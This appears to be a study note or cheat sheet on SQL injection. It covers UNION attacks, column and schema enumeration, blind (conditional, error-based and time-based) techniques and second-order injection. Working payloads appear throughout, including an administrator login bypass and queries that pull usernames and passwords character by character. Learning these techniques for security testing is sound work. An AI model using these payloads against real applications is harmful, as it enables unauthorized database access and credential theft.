# SQL Injection

## What is SQL Injection?

SQL injection could allow an attacker to read and/or manipulate the contents of a server's backend database.

##  Impact

SQL injection can lead to sensitive data exposure such as credit card information or unreleased products or access to the backend system.

## Examples

#### Retrieving hidden data

If you manage to cancel out any limitations placed on the data the SQL query can retrieve, you can possibly get access to hidden information or data from unrelated caregories.

You can achieve this by either commenting out any checks performed,

`SELECT * FROM products WHERE category = 'Gifts' -- '`

or remove the checks alltogether:

`SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --'`

#### Subverting application logic

One can bypass parts of the application logic, e.g. checks for a valid password in order to get access.

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

#### Retrieving data from other tables

If the query results are shown to the user you can display information from other tables, given you know the table and column names.

`SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users -- '`

## UNION attacks

These only work if:

- All of the `SELECT` queries return the same number of columns
- The datatypes of the column are compatible

### Determining the number of columns

#### With `ORDER BY`

Have to application try to order the results by a specific column index. Once it returns an error, you know the previous index was the correct number of columns.

```
' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--  
etc.
```

#### `UNION` with `NULL` values

The same principle as the above method but using `NULL` values as column names. Again, once you see an error you have the correct number of columns.

```
' UNION SELECT NULL--  
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--  
etc.
```

### Determine columns data types

Since you want the results to be returned in string form, you can just replace `NULL` with `'A'` and see if it returns an error. You can also see the actual datatype of the column in the error.

```
' UNION SELECT 'a',NULL,NULL,NULL--  
' UNION SELECT NULL,'a',NULL,NULL--
```

### Examining the database

#### Database type and version

- Microsoft, MySQL

	`SELECT @@version`
	
- Oracle

	```
	SELECT banner FROM v$version`
	SELECT version FROM v$instance
	```

- PostgreSQL

	`SELECT version()`
	
#### Database contents

- Microsoft, MySQL, PostgreSQL

	```
	SELECT * FROM information_schema.tables
	SELECT * FROM information_schema.columns WHERE table_name = '<TABLE>'
	```

- Oracle

	```
	SELECT * FROM all_tables
	SELECT * FROM all_tab_columns WHERE table_name = '<TABLE>'
	```
	
Check out the [resources](#resources) for more information about specific syntax.

#### Retrieving multiple values within a single column

If you can display only a single column you can still concatenate data from multiple columns and display it there. Provide a suitable separator for increased visibility.

- Microsoft

	`'foo'+'bar'`
	
- MySQL

	```
	'foo' 'bar'
	CONCAT('foo','bar')
	```
	
- Oracle and PostgreSQL

	`'foo' || 'bar'`

## Blind SQLi

#### What is blind SQL injection

Blind SQLi is when you know a website is vulnerable to SQL injection but it does not return any (visible) output. This makes attacks like e.g. UNION-attacks useless since they rely on seeing the output.

You can still exploit this by either conditional responses, time-based attacks or out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques.

#### Conditional responses

You can use conditional expressions to brute force usernames or passwords if you know the result of a valid query. E.g. if you have a session token and you get logged in after a valid query and not after an invalid one.

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

#### Error based

You can cause exceptions and errors in the database e.g. with division by 0 which might alter the HTTP response in some way.

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

#### Time based

This again uses the same principles as conditional- and error-based testing. If a conditions is valid, you will e.g. cause a 10s delay before the response is sent. 

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

## Second-order SQLi

Second-order SQLi means that you don't immediately get the results of your payload. Only after the payload is stored in the database and used in a different query later will it activate.

An example would be when registering an account on some website. You can incorporate a payload to change the admin password in your chosen username. Later when you e.g. request to change your own password, the application will use your username in the query and your payload activates.

This often happens when developers only secure the initial input for their application and don't think about securing inner functions not available to the user. 

Graphic by PortSwigger ([source](https://portswigger.net/web-security/sql-injection)):

![](sql-injection.svg)

## Methodology

These are typically the steps taken after you found a possible SQL injection:

1. Check for the number of columns with `ORDER BY` or `UNION` attacks
2. Determine which of these columns is able to display strings
3. Determine the type and version of the database in use by trying out different syntax, preferably syntax for displaying the version
4. Get information about the database schema and contents
	- Which tables are available?
	- Which tables are interesting and what columns do they contain?


## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection)
- [MySQL 'information_schema' table](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)
- [Oracle 'all_tables' table](https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2105.htm#REFRN20286)
- [InfoSecInstitute SQL Injection Intro](https://resources.infosecinstitute.com/topic/sql-injections-introduction/)
